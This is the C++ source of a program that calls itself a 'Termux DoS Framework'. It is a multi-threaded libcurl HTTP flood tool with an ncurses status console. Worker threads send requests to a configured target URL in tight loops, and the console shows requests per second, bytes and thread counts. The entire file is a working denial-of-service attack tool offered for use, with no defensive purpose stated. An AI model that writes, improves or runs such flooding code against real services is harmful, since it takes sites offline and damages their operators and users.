// Copyright DexxVikalz Developer
// Termux DoS Framework — Multi-threaded async HTTP flood

#include <ncurses.h>
#include <curl/curl.h>
#include <pthread.h>
#include <atomic>
#include <string>
#include <chrono>
#include <cstring>
#include <unistd.h>

struct Stats {
    std::atomic<long> requests{0};
    std::atomic<long> bytes{0};
    std::atomic<int> active_threads{0};
    std::atomic<bool> running{false};
    long start_time{0};
};

struct Target {
    std::string url;
    int threads;
    std::string user_agent;
    int timeout;
};

Stats global_stats;
Target target_cfg;

static size_t discard_write(void* contents, size_t size, size_t nmemb, void* userp) {
    global_stats.bytes += size * nmemb;
    return size * nmemb;
}

void* flood_worker(void* arg) {
    global_stats.active_threads++;
    CURL* curl = curl_easy_init();
    if (!curl) return nullptr;

    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Connection: close");
    headers = curl_slist_append(headers, "Cache-Control: no-cache");

    while (global_stats.running) {
        curl_easy_setopt(curl, CURLOPT_URL, target_cfg.url.c_str());
        curl_easy_setopt(curl, CURLOPT_USERAGENT, target_cfg.user_agent.c_str());
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, target_cfg.timeout);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, discard_write);
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 2L);
        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 0L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);

        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) global_stats.requests++;
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    global_stats.active_threads--;
    return nullptr;
}

void render_ui() {
    clear();
    
    long elapsed = std::chrono::duration_cast<std::chrono::seconds>(
        std::chrono::system_clock::now().time_since_epoch()
    ).count() - global_stats.start_time;
    
    double rps = elapsed > 0 ? (double)global_stats.requests / elapsed : 0;
    double bps = elapsed > 0 ? (double)global_stats.bytes / elapsed : 0;

    attron(COLOR_PAIR(1) | A_BOLD);
    mvprintw(1, 2, "DexxVikalz DoS Framework");
    attroff(COLOR_PAIR(1) | A_BOLD);

    attron(COLOR_PAIR(2));
    mvprintw(3, 2, "Target: %s", target_cfg.url.c_str());
    mvprintw(4, 2, "Status: %s", global_stats.running ? "RUNNING" : "IDLE");
    
    mvprintw(6, 2, "Requests: %ld (%.2f req/s)", global_stats.requests, rps);
    mvprintw(7, 2, "Bytes Sent: %ld (%.2f KB/s)", global_stats.bytes, bps / 1024);
    mvprintw(8, 2, "Active Threads: %d/%d", 
        (int)global_stats.active_threads, target_cfg.threads);
    mvprintw(9, 2, "Elapsed: %ld sec", elapsed);
    attroff(COLOR_PAIR(2));

    attron(COLOR_PAIR(3));
    mvprintw(11, 2, "[S]tart  [P]ause  [R]esume  [Q]uit");
    attroff(COLOR_PAIR(3));

    refresh();
}

int main() {
    initscr();
    cbreak();
    noecho();
    keypad(stdscr, TRUE);
    nodelay(stdscr, TRUE);

    start_color();
    init_pair(1, COLOR_CYAN, COLOR_BLACK);
    init_pair(2, COLOR_GREEN, COLOR_BLACK);
    init_pair(3, COLOR_YELLOW, COLOR_BLACK);

    target_cfg.url = "http://target.local/";
    target_cfg.threads = 32;
    target_cfg.user_agent = "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36";
    target_cfg.timeout = 5;

    pthread_t workers[256];
    int thread_count = 0;

    global_stats.running = false;

    while (true) {
        render_ui();
        int ch = getch();

        if (ch == 'q' || ch == 'Q') break;
        
        if (ch == 's' || ch == 'S') {
            if (!global_stats.running) {
                global_stats.running = true;
                global_stats.requests = 0;
                global_stats.bytes = 0;
                global_stats.start_time = std::chrono::duration_cast<std::chrono::seconds>(
                    std::chrono::system_clock::now().time_since_epoch()
                ).count();

                for (int i = 0; i < target_cfg.threads; i++) {
                    pthread_create(&workers[i], nullptr, flood_worker, nullptr);
                }
                thread_count = target_cfg.threads;
            }
        }
        
        if (ch == 'p' || ch == 'P') {
            global_stats.running = false;
        }
        
        if (ch == 'r' || ch == 'R') {
            global_stats.running = true;
        }

        usleep(100000);
    }

    global_stats.running = false;
    for (int i = 0; i < thread_count; i++) {
        pthread_join(workers[i], nullptr);
    }

    endwin();
    return 0;
}
